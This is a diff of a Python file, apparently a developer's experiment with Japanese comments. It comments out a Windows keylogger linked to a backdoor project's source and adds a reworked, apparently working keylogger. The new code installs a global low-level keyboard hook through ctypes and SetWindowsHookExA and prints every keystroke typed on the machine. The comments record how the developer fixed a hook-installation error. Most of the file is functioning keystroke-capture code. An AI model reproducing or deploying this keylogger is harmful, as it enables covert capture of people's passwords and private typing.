@@ -1,4 +1,6 @@
-﻿#import threading, time
+﻿# coding: utf-8
+
+#import threading, time
 #from ctypes import *
 
 #class Thread():
@@ -222,127 +224,230 @@
 
 
 
-# こういうのもある
-# https://programtalk.com/vs4/python/7022/backdoorme/backdoors/shell/pupy/pupy/packages/windows/all/pupwinutils/keylogger.py/
-# ループでキー全部チェックするのではなく、イベントフックでOSから発行されたキーイベントメッセージを受け取る
+## こういうのもある
+## https://programtalk.com/vs4/python/7022/backdoorme/backdoors/shell/pupy/pupy/packages/windows/all/pupwinutils/keylogger.py/
+## ループでキー全部チェックするのではなく、イベントフックでOSから発行されたキーイベントメッセージを受け取る
 
-# マウスロガーは？
-
-
-import sys
-from ctypes import *
-from ctypes.wintypes import MSG
-from ctypes.wintypes import DWORD
-import threading
-import time
-
-user32 = windll.user32
-kernel32 = windll.kernel32
-WH_KEYBOARD_LL=13
-WM_KEYDOWN=0x0100
-
-keyCodes={
-    0x08 : "[BKSP]",
-    0x09 : "[TAB]",
-    0x0D : "\n",
-    0x10 : "[SHIFT]",
-    0x11 : "[CTRL]",
-    0x12 : "[ALT]",
-    0x13 : "[PAUSE]",
-    0x14 : "[CAPS_LOCK]",
-    0x1B : "[ESCAPE]",
-    0x20 : " ",
-    0x25 : "[LEFT]",
-    0x26 : "[UP]",
-    0x27 : "[RIGHT]",
-    0x28 : "[DOWN]",
-    0x2C : "[PRINT_SCREEN]",
-    0x2E : "[DEL]",
-    0x90 : "[NUM_LOCk]",
-    0xA0 : "[LSHIFT]",
-    0xA1 : "[RSHIFT]",
-    0xA2 : "[LCTRL]",
-    0xA3 : "[RCTRL]",
-    0xA4 : "[LMENU]",
-    0xA5 : "[RMENU]",
-}
-
-class KeyLogger(threading.Thread):
-    def __init__(self, *args, **kwargs):
-        threading.Thread.__init__(self, *args, **kwargs)
-        self.hooked	 = None
-        self.daemon=True
-        self.keys_buffer=""
-        self.lUser32=user32
-        self.pointer=None
-        self.stopped=False
-
-    def run(self):
-        if( self.install_hook() ):
-            print( "keylogger installed")
-        else:
-            raise RuntimeError("couldn't install keylogger")
-        msg = MSG()
-        user32.GetMessageA(byref(msg),0,0,0)
-        while not self.stopped:
-            time.sleep(1)
-        self.uninstall_hook()
-
-    def stop(self):
-        self.stopped=True
-
-    def dump(self):
-        res=self.keys_buffer
-        self.keys_buffer=""
-        return res
-
-    def convert_key_code(self, code):
-        #https://msdn.microsoft.com/fr-fr/library/windows/desktop/dd375731%28v=vs.85%29.aspx
-        if code >=0x41 and code <=0x5a: # letters
-            return chr(code)
-        elif code>=0x30 and code <=0x39: # numbers
-            return str(code-0x30)
-        elif code>=0x60 and code <=0x69: # keypad numbers
-            return str(code-0x60)
-        elif code in keyCodes:
-            return keyCodes[code]
-        return "[%02x]"%code
-
-    def install_hook( self ):
-        CMPFUNC = CFUNCTYPE(c_int, c_int, c_int, POINTER(c_void_p))
-        self.pointer = CMPFUNC( self.hook_proc )
-        self.hooked = self.lUser32.SetWindowsHookExA( WH_KEYBOARD_LL, self.pointer, kernel32.GetModuleHandleW(None), 0 )
-        if not self.hooked:
-            return False
-        return True
+## マウスロガーは？
 
 
-    def uninstall_hook(self):												  
-        if self.hooked is None:
-            return
-        self.lUser32.UnhookWindowsHookEx(self.hooked)
-        self.hooked = None
+#import sys
+#from ctypes import *
+#from ctypes.wintypes import MSG
+#from ctypes.wintypes import DWORD
+#import threading
+#import time
+
+#user32 = windll.user32
+#kernel32 = windll.kernel32
+#WH_KEYBOARD_LL=13
+#WM_KEYDOWN=0x0100
+
+#keyCodes={
+#    0x08 : "[BKSP]",
+#    0x09 : "[TAB]",
+#    0x0D : "\n",
+#    0x10 : "[SHIFT]",
+#    0x11 : "[CTRL]",
+#    0x12 : "[ALT]",
+#    0x13 : "[PAUSE]",
+#    0x14 : "[CAPS_LOCK]",
+#    0x1B : "[ESCAPE]",
+#    0x20 : " ",
+#    0x25 : "[LEFT]",
+#    0x26 : "[UP]",
+#    0x27 : "[RIGHT]",
+#    0x28 : "[DOWN]",
+#    0x2C : "[PRINT_SCREEN]",
+#    0x2E : "[DEL]",
+#    0x90 : "[NUM_LOCk]",
+#    0xA0 : "[LSHIFT]",
+#    0xA1 : "[RSHIFT]",
+#    0xA2 : "[LCTRL]",
+#    0xA3 : "[RCTRL]",
+#    0xA4 : "[LMENU]",
+#    0xA5 : "[RMENU]",
+#}
+
+#class KeyLogger(threading.Thread):
+#    def __init__(self, *args, **kwargs):
+#        threading.Thread.__init__(self, *args, **kwargs)
+#        self.hooked	 = None
+#        self.daemon=True
+#        self.keys_buffer=""
+#        self.lUser32=user32
+#        self.pointer=None
+#        self.stopped=False
+
+#    def run(self):
+#        if( self.install_hook() ):
+#            print( "keylogger installed")
+#        else:
+#            raise RuntimeError("couldn't install keylogger")
+#        msg = MSG()
+#        user32.GetMessageA(byref(msg),0,0,0)
+#        while not self.stopped:
+#            time.sleep(1)
+#        self.uninstall_hook()
+
+#    def stop(self):
+#        self.stopped=True
+
+#    def dump(self):
+#        res=self.keys_buffer
+#        self.keys_buffer=""
+#        return res
+
+#    def convert_key_code(self, code):
+#        #https://msdn.microsoft.com/fr-fr/library/windows/desktop/dd375731%28v=vs.85%29.aspx
+#        if code >=0x41 and code <=0x5a: # letters
+#            return chr(code)
+#        elif code>=0x30 and code <=0x39: # numbers
+#            return str(code-0x30)
+#        elif code>=0x60 and code <=0x69: # keypad numbers
+#            return str(code-0x60)
+#        elif code in keyCodes:
+#            return keyCodes[code]
+#        return "[%02x]"%code
+
+#    def install_hook( self ):
+#        CMPFUNC = CFUNCTYPE(c_int, c_int, c_int, POINTER(c_void_p))
+#        self.pointer = CMPFUNC( self.hook_proc )
+       
+## https://stackoverflow.com/questions/49898751/setwindowshookex-gives-error-126-module-not-found-when
+#        #ctypes LoadLibraryW()
+#        self.hooked = self.lUser32.SetWindowsHookExA( WH_KEYBOARD_LL, self.pointer, kernel32.GetModuleHandleW(None), 0 )
+#        if not self.hooked:
+#            print( str( kernel32.GetLastError()) )
+#            return False
+#        return True
 
 
-    def hook_proc( self, nCode, wParam, lParam ):
-        if( wParam is not WM_KEYDOWN ):
-            return user32.CallNextHookEx( self.hooked, nCode, wParam, lParam )
-        hooked_key = self.convert_key_code( lParam[0] )
-        self.keys_buffer+=hooked_key
-        return user32.CallNextHookEx( self.hooked, nCode, wParam, lParam )
+#    def uninstall_hook(self):												  
+#        if self.hooked is None:
+#            return
+#        self.lUser32.UnhookWindowsHookEx(self.hooked)
+#        self.hooked = None
+
+
+#    def hook_proc( self, nCode, wParam, lParam ):
+#        if( wParam is not WM_KEYDOWN ):
+#            return user32.CallNextHookEx( self.hooked, nCode, wParam, lParam )
+#        hooked_key = self.convert_key_code( lParam[0] )
+#        self.keys_buffer+=hooked_key
+#        return user32.CallNextHookEx( self.hooked, nCode, wParam, lParam )
 
 
 
 
-if __name__=="__main__":
-    keyLogger = KeyLogger()
-    keyLogger.start()
-    while True:
-        time.sleep(5)
-        print( keyLogger.dump() )
+#if __name__=="__main__":
+#    keyLogger = KeyLogger()
+#    keyLogger.start()
+#    while True:
+#        time.sleep(5)
+#        print( keyLogger.dump() )
 
 
 
 
 # TODO:上のコードだと self.lUser32.SetWindowsHookExA で引っかかる. 下のやり方はどう?
 # https://stackoverflow.com/questions/53732628/python-using-winapi-setwindowshookexa-on-windows-10
+
+
+import win32con
+import ctypes
+from ctypes import *
+from ctypes.wintypes import DWORD
+
+user32 = windll.user32#CDLL("user32.dll")#
+kernel32 = windll.kernel32#CDLL("kernel32.dll")#
+
+
+class KBDLLHOOKSTRUCT( Structure ):
+    _fields_ = (
+        ( "vkCode", DWORD ),    
+        ( "scanCode", DWORD ),
+        ( "flags", DWORD ),
+        ( "time", DWORD ),
+        ( "dwExtraInfo", DWORD )
+    )
+
+HOOKPROC = WINFUNCTYPE( HRESULT, ctypes.c_int, ctypes.wintypes.WPARAM, ctypes.wintypes.LPARAM )
+#HOOKPROC = CFUNCTYPE(c_int, c_int, ctypes.wintypes.HINSTANCE, POINTER(c_void_p))
+
+SetWindowsHookEx = ctypes.windll.user32.SetWindowsHookExA
+SetWindowsHookEx.restype = ctypes.wintypes.HHOOK
+SetWindowsHookEx.argtypes = [c_int, HOOKPROC, ctypes.wintypes.HINSTANCE, ctypes.wintypes.DWORD]
+
+
+
+class KeyLogger:
+
+    def __init__( self ):
+        self.lUser32 = user32
+        self.hooked = None
+
+
+    def InstallHookProc( self, pointer ):
+
+        # hinstの入力に注意. https://stackoverflow.com/questions/49898751/setwindowshookex-gives-error-126-module-not-found-when
+        # 明示的にやらないと126(module not found)が発生して関数フックできない
+        hinst = ctypes.windll.LoadLibrary('user32')._handle
+        #hinst = kernel32.GetModuleHandleW( None )._handle
+
+        self.hooked = SetWindowsHookEx(#self.lUser32.SetWindowsHookExA(
+            win32con.WH_KEYBOARD_LL,
+            pointer,
+            hinst,
+            0
+        )
+
+        if( not self.hooked ):
+            print( "Failed hook procedure installation:", str( kernel32.GetLastError() ) )
+            return False
+
+        print( "Installed hook procedure" )
+        return True
+
+
+    def UninstallHookProc( self ):
+        if( self.hooked is None ):
+            return
+
+        self.lUser32.UnhookWindowsHookEx( self.hooked )
+        self.hooked = None
+
+
+
+def HookProc( nCode, wParam, lParam ):
+
+    if( user32.GetKeyState(win32con.VK_CONTROL) & 0x8000 ):
+        print("\nCtrl pressed, call uninstallHook()" )
+        KeyLogger.UninstallHookProc()
+        return 0
+
+    if( nCode == win32con.HC_ACTION and wParam == win32con.WM_KEYDOWN ):
+        kb = KBDLLHOOKSTRUCT.from_address( lParam )
+        user32.GetKeyState( win32con.VK_SHIFT )
+        user32.GetKeyState( win32con.VK_MENU )
+        state = ( ctypes.c_char * 256 )()
+        user32.GetKeyboardState( byref(state) )
+        str = create_unicode_buffer(8)
+        n = user32.ToUnicode( kb.vkCode, kb.scanCode, state, str, 8-1, 0 )
+        if( n > 0 ):
+            if( kb.vkCode == win32con.VK_RETURN ):
+                print()
+            else:
+                print( ctypes.wstring_at(str), end="", flush=True )
+
+    return ctypes.windll.user32.CallNextHookEx( KeyLogger.hooked, nCode, wParam, ctypes.c_longlong(lParam) )
+
+
+
+if __name__=="__main__":
+
+    KeyLogger = KeyLogger()
+    pointer = HOOKPROC( HookProc )
+    KeyLogger.InstallHookProc( pointer )
+    msg = ctypes.wintypes.MSG()
+    user32.GetMessageA( byref(msg), 0, 0, 0 )
